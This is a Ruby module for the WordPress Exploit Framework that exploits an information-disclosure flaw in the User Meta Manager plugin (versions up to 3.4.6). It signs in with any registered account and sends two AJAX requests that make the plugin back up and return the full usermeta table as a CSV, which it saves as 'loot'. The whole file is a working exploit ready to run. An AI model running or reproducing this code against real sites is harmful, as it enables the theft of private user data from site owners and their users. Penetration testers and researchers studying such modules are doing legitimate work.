# frozen_string_literal: true

require 'wpxf/helpers/export'

class Wpxf::Auxiliary::UserMetaManagerInformationDisclosure < Wpxf::Module
  include Wpxf
  include Wpxf::Helpers::Export

  def initialize
    super

    update_info(
      name: 'User Meta Manager <= 3.4.6 Information Disclosure',
      desc: %(
        The User Meta Manager plugin up to and including v3.4.6,
        suffers from an information disclosure vulnerability.
        Any registered user can perform a series of AJAX requests,
        in order to get all the contents of the `usermeta` table.
      ),
      author: [
        'Panagiotis Vagenas', # Disclosure
        'rastating'           # WPXF module
      ],
      references: [
        ['WPVDB', '8384'],
        ['URL', 'http://seclists.org/bugtraq/2016/Feb/48']
      ],
      date: 'Feb 01 2016'
    )

    register_options([
      StringOption.new(
        name: 'username',
        desc: 'The WordPress username to authenticate with',
        required: true
      ),
      StringOption.new(
        name: 'password',
        desc: 'The WordPress password to authenticate with',
        required: true
      )
    ])
  end

  def username
    datastore['username']
  end

  def password
    datastore['password']
  end

  def check
    check_plugin_version_from_readme('user-meta-manager', '3.4.7')
  end

  def backup_table(cookie)
    execute_get_request(
      url: wordpress_url_admin_ajax,
      cookie: cookie,
      params: {
        'action' => 'umm_switch_action',
        'umm_sub_action' => 'umm_backup'
      }
    )
  end

  def download_backup(cookie)
    execute_get_request(
      url: wordpress_url_admin_ajax,
      cookie: cookie,
      params: {
        'action' => 'umm_switch_action',
        'umm_sub_action' => 'umm_get_csv'
      }
    )
  end

  def run
    return false unless super

    cookie = authenticate_with_wordpress(username, password)
    return false unless cookie

    emit_info 'Creating table backup...'
    backup_table(cookie)

    emit_info 'Downloading table backup...'
    res = download_backup(cookie)

    loot = export_and_log_loot res.body, 'backup of the usermeta table', 'backup', '.csv'
    emit_success "Downloaded backup to #{loot.path}"

    true
  end
end
